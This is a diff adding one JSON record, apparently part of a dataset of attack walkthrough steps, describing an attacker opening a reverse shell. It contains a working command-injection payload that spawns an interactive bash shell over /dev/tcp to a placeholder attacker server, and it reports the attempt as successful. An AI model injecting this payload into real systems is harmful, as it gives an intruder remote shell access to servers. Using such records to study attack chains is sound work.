@@ -1,0 +1,13 @@
+{
+    "Step4": {
+        "Description": "The attacker decides to establish a reverse shell connection to the server.",
+        "ToolsUsed": "null",
+        "StepDetails": {
+            "Hypothesis": "The attacker seeks to gain interactive access to the server for further exploration.",
+            "Action": "The attacker injects the payload '; bash -c \"bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1\" #', replacing 'your.server.ip.address' with their own server's IP.",
+            "Result": "The attacker successfully establishes a reverse shell connection to their server, gaining interactive access to the server's shell.",
+            "Success": "Success",
+            "FailingReason": "null"
+        }
+    }
+}
